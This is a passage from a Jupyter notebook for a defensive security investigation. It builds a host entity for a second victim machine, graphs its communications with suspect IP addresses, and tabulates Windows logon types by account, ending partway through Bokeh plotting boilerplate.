    "if len(oms_heartbeat_df) > 0:\n",
    "    host_name = oms_heartbeat_df['Computer'].at[0]\n",
    "    \n",
    "\n",
    "# Get the host entity and add this IP and system info to the \n",
    "try:\n",
    "    if not victim_host_entity:\n",
    "        victim_host_entity = mas.Host()\n",
    "        victim_host_entity.HostName = host_name\n",
    "except NameError:\n",
    "    victim_host_entity = mas.Host()\n",
    "    victim_host_entity.HostName = host_name\n",
    "\n",
    "def convert_to_ip_entities(ip_str):\n",
    "    ip_entities = []\n",
    "    if ip_str:\n",
    "        if ',' in ip_str:\n",
    "            addrs = ip_str.split(',')\n",
    "        elif ' ' in ip_str:\n",
    "            addrs = ip_str.split(' ')\n",
    "        else:\n",
    "            addrs = [ip_str]\n",
    "        for addr in addrs:\n",
    "            ip_entity = mas.IpAddress()\n",
    "            ip_entity.Address = addr.strip()\n",
    "            iplocation.lookup_ip(ip_entity=ip_entity)\n",
    "            ip_entities.append(ip_entity)\n",
    "    return ip_entities\n",
    "\n",
    "# Add this information to our inv_host_entity\n",
    "retrieved_pub_addresses = []\n",
    "if len(az_net_df) == 1:\n",
    "    priv_addr_str = az_net_df['PrivateIPAddresses'].loc[0]\n",
    "    victim_host_entity.properties['private_ips'] = convert_to_ip_entities(priv_addr_str)\n",
    "\n",
    "    pub_addr_str = az_net_df['PublicIPAddresses'].loc[0]\n",
    "    victim_host_entity.properties['public_ips'] = convert_to_ip_entities(pub_addr_str)\n",
    "    retrieved_pub_addresses = [ip.Address for ip in victim_host_entity.properties['public_ips']]\n",
    "    \n",
    "if len(oms_heartbeat_df) == 1:\n",
    "    if oms_heartbeat_df['ComputerIP'].loc[0]:\n",
    "        oms_address = oms_heartbeat_df['ComputerIP'].loc[0]\n",
    "        if oms_address not in retrieved_address:\n",
    "            ip_entity = mas.IpAddress()\n",
    "            ip_entity.Address = oms_address\n",
    "            iplocation.lookup_ip(ip_entity=ip_entity)\n",
    "            inv_host_entity.properties['public_ips'].append(ip_entity)\n",
    "        \n",
    "    victim_host_entity.OSFamily = oms_heartbeat_df['OSType'].loc[0]\n",
    "    victim_host_entity.AdditionalData['OSMajorVersion'] = oms_heartbeat_df['OSMajorVersion'].loc[0]\n",
    "    victim_host_entity.AdditionalData['OSMinorVersion'] = oms_heartbeat_df['OSMinorVersion'].loc[0]\n",
    "    victim_host_entity.AdditionalData['SourceComputerId'] = oms_heartbeat_df['SourceComputerId'].loc[0]\n",
    "\n",
    "print(f'Found New Host Entity {victim_host_entity.HostName}\\n')\n",
    "print(victim_host_entity)\n",
    "\n",
    "add_observation(Observation(caption=f'Second victim host identified {victim_host_entity.HostName}',\n",
    "                            description='Description of host entity shown in attachment.',\n",
    "                            item=victim_host_entity,\n",
    "                            link='other_hosts_to_ips'))\n",
    "\n",
    "\n",
    "\n",
    "sns.set()\n",
    "from matplotlib import MatplotlibDeprecationWarning\n",
    "warnings.simplefilter(\"ignore\", category=MatplotlibDeprecationWarning)\n",
    "\n",
    "ip_graph = nx.DiGraph(id='IPGraph')\n",
    "\n",
    "def add_vm_node(graph, host_entity):\n",
    "    vm_name = host_entity.HostName\n",
    "    vm_ip = host_entity.private_ips[0].Address\n",
    "    vm_desc = f'{host_entity.HostName}'\n",
    "    ip_graph.add_node(vm_ip, name=vm_name, description=vm_desc,\n",
    "                      node_type='host')\n",
    "\n",
    "for ip_entity in alert_ip_entities:\n",
    "    if 'Location' in ip_entity:\n",
    "        ip_desc = f'{ip_entity.Address}\\n{ip_entity.Location.City}, {ip_entity.Location.CountryName}'\n",
    "    else:\n",
    "        ip_desc = 'unknown location'\n",
    "    ip_graph.add_node(ip_entity.Address, name=ip_entity.Address, description=ip_desc, node_type='ip')\n",
    "\n",
    "add_vm_node(ip_graph, inv_host_entity)\n",
    "add_vm_node(ip_graph, victim_host_entity)\n",
    "\n",
    "\n",
    "def add_edges(graph, row): \n",
    "    dest_ip = row.DestIP if row.DestIP else row.VMIPAddress\n",
    "    if row.SrcIP:\n",
    "        src_ip = row.SrcIP\n",
    "        ip_graph.add_edge(src_ip, dest_ip)\n",
    "    else:\n",
    "        for ip in row.PublicIPs:\n",
    "            src_ip = ip\n",
    "            ip_graph.add_edge(src_ip, dest_ip)\n",
    "\n",
    "    \n",
    "# Add edges from network data\n",
    "az_net_ext_comms_df.apply(lambda x: add_edges(ip_graph, x),axis=1)\n",
    "\n",
    "src_node = [n for (n, node_type) in\n",
    "            nx.get_node_attributes(ip_graph, 'node_type').items()\n",
    "            if node_type == 'ip']\n",
    "vm_nodes = [n for (n, node_type) in\n",
    "            nx.get_node_attributes(ip_graph, 'node_type').items()\n",
    "            if node_type == 'host']\n",
    "\n",
    "# now draw them in subsets  using the `nodelist` arg\n",
    "plt.rcParams['figure.figsize'] = (10, 10)\n",
    "plt.margins(x=0.3, y=0.3)\n",
    "plt.title('Comms between hosts and suspect IPs')\n",
    "pos = nx.circular_layout(ip_graph)\n",
    "nx.draw_networkx_nodes(ip_graph, pos, nodelist=src_node,\n",
    "                       node_color='red', alpha=0.5, node_shape='o')\n",
    "nx.draw_networkx_nodes(ip_graph, pos, nodelist=vm_nodes,\n",
    "                       node_color='green', alpha=0.5, node_shape='s',\n",
    "                       s=400)\n",
    "nlabels = nx.get_node_attributes(ip_graph, 'description')\n",
    "nx.relabel_nodes(ip_graph, nlabels)\n",
    "nx.draw_networkx_labels(ip_graph, pos, nlabels, font_size=15)\n",
    "nx.draw_networkx_edges(ip_graph, pos, alpha=0.5, arrows=True, arrowsize=20);\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Observations\n",
    "- We have found a new IP address that our attacker has also been communicating with. We should investigate that machine.\n",
    "- From the name looks like a Windows host\n",
    "- There is also another public IP involved that has been taking to both hosts. We should look at that."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id='other_host_investigate'></a>[Contents](#toc)\n",
    "# Other Hosts Communicating with IP\n",
    "Investigating the second host in the attack graph."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<a id='host_logons'></a>[Contents](#toc)\n",
    "## Check Host Logons"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {
    "hidden": true,
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "getting data...\n"
     ]
    },
    {
     "data": {
      "text/markdown": [
       "### Classification of Logon Types by Account"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/markdown": [
       "### Counts of logon events by logon type."
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/markdown": [
       "Min counts for each logon type highlighted."
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<style  type=\"text/css\" >\n",
       "    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow0_col0 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow0_col1 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow0_col2 {\n",
       "            background-color:  #d0e11c;\n",
       "            color:  #000000;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow0_col3 {\n",
       "            background-color:  #fde725;\n",
       "            color:  #000000;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow0_col4 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow0_col5 {\n",
       "            background-color:  #35b779;\n",
       "            color:  #000000;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow1_col0 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow1_col1 {\n",
       "            background-color:  #1f9e89;\n",
       "            color:  #000000;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow1_col2 {\n",
       "            background-color:  #fde725;\n",
       "            color:  #000000;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow1_col3 {\n",
       "            background-color:  #1f968b;\n",
       "            color:  #000000;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow1_col4 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow1_col5 {\n",
       "            background-color:  #fde725;\n",
       "            color:  #000000;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow2_col0 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow2_col1 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow2_col2 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow2_col3 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow2_col4 {\n",
       "            background-color:  #306a8e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow2_col5 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow3_col0 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow3_col1 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow3_col2 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow3_col3 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow3_col4 {\n",
       "            background-color:  #306a8e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow3_col5 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow4_col0 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow4_col1 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow4_col2 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow4_col3 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow4_col4 {\n",
       "            background-color:  #306a8e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow4_col5 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow5_col0 {\n",
       "            background-color:  #fde725;\n",
       "            color:  #000000;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow5_col1 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow5_col2 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow5_col3 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow5_col4 {\n",
       "            background-color:  #fde725;\n",
       "            color:  #000000;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow5_col5 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow6_col0 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow6_col1 {\n",
       "            background-color:  #6ece58;\n",
       "            color:  #000000;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow6_col2 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow6_col3 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow6_col4 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow6_col5 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow7_col0 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow7_col1 {\n",
       "            background-color:  #fde725;\n",
       "            color:  #000000;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow7_col2 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow7_col3 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow7_col4 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow7_col5 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow8_col0 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow8_col1 {\n",
       "            background-color:  #1f9e89;\n",
       "            color:  #000000;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow8_col2 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow8_col3 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow8_col4 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow8_col5 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow9_col0 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow9_col1 {\n",
       "            background-color:  #1f9e89;\n",
       "            color:  #000000;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow9_col2 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow9_col3 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow9_col4 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }    #T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow9_col5 {\n",
       "            background-color:  #31688e;\n",
       "            color:  #f1f1f1;\n",
       "        }</style><table id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2a\" ><thead>    <tr>        <th class=\"blank level0\" ></th>        <th class=\"col_heading level0 col0\" colspan=6>EventID</th>    </tr>    <tr>        <th class=\"index_name level1\" >LogonType</th>        <th class=\"col_heading level1 col0\" >0</th>        <th class=\"col_heading level1 col1\" >2</th>        <th class=\"col_heading level1 col2\" >3</th>        <th class=\"col_heading level1 col3\" >4</th>        <th class=\"col_heading level1 col4\" >5</th>        <th class=\"col_heading level1 col5\" >10</th>    </tr>    <tr>        <th class=\"index_name level0\" >Account</th>        <th class=\"blank\" ></th>        <th class=\"blank\" ></th>        <th class=\"blank\" ></th>        <th class=\"blank\" ></th>        <th class=\"blank\" ></th>        <th class=\"blank\" ></th>    </tr></thead><tbody>\n",
       "                <tr>\n",
       "                        <th id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2alevel0_row0\" class=\"row_heading level0 row0\" >MSTICAlertsWin1\\MSTICAdmin</th>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow0_col0\" class=\"data row0 col0\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow0_col1\" class=\"data row0 col1\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow0_col2\" class=\"data row0 col2\" >008</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow0_col3\" class=\"data row0 col3\" >007</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow0_col4\" class=\"data row0 col4\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow0_col5\" class=\"data row0 col5\" >002</td>\n",
       "            </tr>\n",
       "            <tr>\n",
       "                        <th id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2alevel0_row1\" class=\"row_heading level0 row1\" >MSTICAlertsWin1\\ian</th>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow1_col0\" class=\"data row1 col0\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow1_col1\" class=\"data row1 col1\" >002</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow1_col2\" class=\"data row1 col2\" >009</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow1_col3\" class=\"data row1 col3\" >002</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow1_col4\" class=\"data row1 col4\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow1_col5\" class=\"data row1 col5\" >004</td>\n",
       "            </tr>\n",
       "            <tr>\n",
       "                        <th id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2alevel0_row2\" class=\"row_heading level0 row2\" >NT AUTHORITY\\IUSR</th>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow2_col0\" class=\"data row2 col0\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow2_col1\" class=\"data row2 col1\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow2_col2\" class=\"data row2 col2\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow2_col3\" class=\"data row2 col3\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow2_col4\" class=\"data row2 col4\" >002</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow2_col5\" class=\"data row2 col5\" >000</td>\n",
       "            </tr>\n",
       "            <tr>\n",
       "                        <th id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2alevel0_row3\" class=\"row_heading level0 row3\" >NT AUTHORITY\\LOCAL SERVICE</th>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow3_col0\" class=\"data row3 col0\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow3_col1\" class=\"data row3 col1\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow3_col2\" class=\"data row3 col2\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow3_col3\" class=\"data row3 col3\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow3_col4\" class=\"data row3 col4\" >002</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow3_col5\" class=\"data row3 col5\" >000</td>\n",
       "            </tr>\n",
       "            <tr>\n",
       "                        <th id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2alevel0_row4\" class=\"row_heading level0 row4\" >NT AUTHORITY\\NETWORK SERVICE</th>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow4_col0\" class=\"data row4 col0\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow4_col1\" class=\"data row4 col1\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow4_col2\" class=\"data row4 col2\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow4_col3\" class=\"data row4 col3\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow4_col4\" class=\"data row4 col4\" >002</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow4_col5\" class=\"data row4 col5\" >000</td>\n",
       "            </tr>\n",
       "            <tr>\n",
       "                        <th id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2alevel0_row5\" class=\"row_heading level0 row5\" >NT AUTHORITY\\SYSTEM</th>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow5_col0\" class=\"data row5 col0\" >002</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow5_col1\" class=\"data row5 col1\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow5_col2\" class=\"data row5 col2\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow5_col3\" class=\"data row5 col3\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow5_col4\" class=\"data row5 col4\" >139</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow5_col5\" class=\"data row5 col5\" >000</td>\n",
       "            </tr>\n",
       "            <tr>\n",
       "                        <th id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2alevel0_row6\" class=\"row_heading level0 row6\" >Window Manager\\DWM-1</th>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow6_col0\" class=\"data row6 col0\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow6_col1\" class=\"data row6 col1\" >004</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow6_col2\" class=\"data row6 col2\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow6_col3\" class=\"data row6 col3\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow6_col4\" class=\"data row6 col4\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow6_col5\" class=\"data row6 col5\" >000</td>\n",
       "            </tr>\n",
       "            <tr>\n",
       "                        <th id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2alevel0_row7\" class=\"row_heading level0 row7\" >Window Manager\\DWM-2</th>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow7_col0\" class=\"data row7 col0\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow7_col1\" class=\"data row7 col1\" >006</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow7_col2\" class=\"data row7 col2\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow7_col3\" class=\"data row7 col3\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow7_col4\" class=\"data row7 col4\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow7_col5\" class=\"data row7 col5\" >000</td>\n",
       "            </tr>\n",
       "            <tr>\n",
       "                        <th id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2alevel0_row8\" class=\"row_heading level0 row8\" >Window Manager\\DWM-3</th>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow8_col0\" class=\"data row8 col0\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow8_col1\" class=\"data row8 col1\" >002</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow8_col2\" class=\"data row8 col2\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow8_col3\" class=\"data row8 col3\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow8_col4\" class=\"data row8 col4\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow8_col5\" class=\"data row8 col5\" >000</td>\n",
       "            </tr>\n",
       "            <tr>\n",
       "                        <th id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2alevel0_row9\" class=\"row_heading level0 row9\" >Window Manager\\DWM-4</th>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow9_col0\" class=\"data row9 col0\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow9_col1\" class=\"data row9 col1\" >002</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow9_col2\" class=\"data row9 col2\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow9_col3\" class=\"data row9 col3\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow9_col4\" class=\"data row9 col4\" >000</td>\n",
       "                        <td id=\"T_05431f24_3a39_11e9_ac13_dc4a3e99be2arow9_col5\" class=\"data row9 col5\" >000</td>\n",
       "            </tr>\n",
       "    </tbody></table>"
      ],
      "text/plain": [
       "<pandas.io.formats.style.Styler at 0x261df8fb3c8>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/markdown": [
       "logon type key = 0:Unknown;  2:Interactive;  3:Network;  4:Batch;  5:Service;  7:Unlock;  8:NetworkCleartext;  9:NewCredentials;  10:RemoteInteractive;  11:CachedInteractive"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/markdown": [
       "### Logon Timeline"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "    <div class=\"bk-root\">\n",
       "        <a href=\"https://bokeh.pydata.org\" target=\"_blank\" class=\"bk-logo bk-logo-small bk-logo-notebook\"></a>\n",
       "        <span id=\"1217\">Loading BokehJS ...</span>\n",
       "    </div>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "\n",
       "(function(root) {\n",
       "  function now() {\n",
       "    return new Date();\n",
       "  }\n",
       "\n",
       "  var force = true;\n",
       "\n",
       "  if (typeof (root._bokeh_onload_callbacks) === \"undefined\" || force === true) {\n",
       "    root._bokeh_onload_callbacks = [];\n",
       "    root._bokeh_is_loading = undefined;\n",
       "  }\n",
       "\n",
       "  var JS_MIME_TYPE = 'application/javascript';\n",
       "  var HTML_MIME_TYPE = 'text/html';\n",
       "  var EXEC_MIME_TYPE = 'application/vnd.bokehjs_exec.v0+json';\n",
       "  var CLASS_NAME = 'output_bokeh rendered_html';\n",
       "\n",
       "  /**\n",
       "   * Render data to the DOM node\n",
       "   */\n",
       "  function render(props, node) {\n",
       "    var script = document.createElement(\"script\");\n",
       "    node.appendChild(script);\n",
       "  }\n",
       "\n",
       "  /**\n",
       "   * Handle when an output is cleared or removed\n",
       "   */\n",
       "  function handleClearOutput(event, handle) {\n",
       "    var cell = handle.cell;\n",
       "\n",
       "    var id = cell.output_area._bokeh_element_id;\n",
       "    var server_id = cell.output_area._bokeh_server_id;\n",
       "    // Clean up Bokeh references\n",
